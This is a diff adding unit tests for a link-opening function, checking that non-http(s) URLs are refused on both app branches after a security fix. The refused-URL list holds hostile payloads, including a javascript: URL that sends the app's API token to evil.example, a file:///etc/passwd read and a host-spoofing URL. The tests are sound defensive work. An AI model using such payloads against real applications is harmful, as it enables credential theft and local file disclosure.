@@ -37,4 +37,44 @@ describe('openLink', () => {
     openLink('https://example.com');
     expect(openExternal).toHaveBeenCalledWith('https://example.com');
   });
+
+  /**
+   * **S4**: the scheme was checked only on the external branch, so a `javascript:` or `file:` URL was refused
+   * by the system browser and handed straight to an in-app tab — which runs in the app window, where the API
+   * token is. Both branches are asserted per URL, because the defect was that they disagreed.
+   */
+  it('refuses a URL that is not an http(s) link, whichever branch would have taken it', () => {
+    const refused = [
+      'javascript:fetch("//evil.example?t="+localStorage.apiToken)',
+      'file:///etc/passwd',
+      'data:text/html,<script>alert(1)</script>',
+      'apack://install?pack=evil',
+      'not a url at all',
+      // The host this reads as is evil.example, not apple.com
+      'https://apple.com@evil.example/',
+    ];
+
+    for (const url of refused) {
+      const withBrowser = bindWith('default-setup/browser');
+      openLink(url);
+      expect(withBrowser.received, `${url} reached an in-app tab`).toEqual([]);
+      expect(withBrowser.openExternal, `${url} reached the system browser`).not.toHaveBeenCalled();
+      unbindFeHost();
+
+      const withoutBrowser = bindWith(undefined);
+      openLink(url);
+      expect(withoutBrowser.openExternal, `${url} reached the system browser`).not.toHaveBeenCalled();
+      unbindFeHost();
+    }
+  });
+
+  // The population half: a rule that refused everything would satisfy the case above while breaking the app
+  it('still opens the links the app actually shows', () => {
+    for (const url of ['https://example.com/a?b=c', 'http://localhost:5173/', 'https://docs.apack.dev/x#y']) {
+      const { received } = bindWith('default-setup/browser');
+      openLink(url);
+      expect(received, url).toEqual([{ type: 'LINK.OPEN', url }]);
+      unbindFeHost();
+    }
+  });
 });
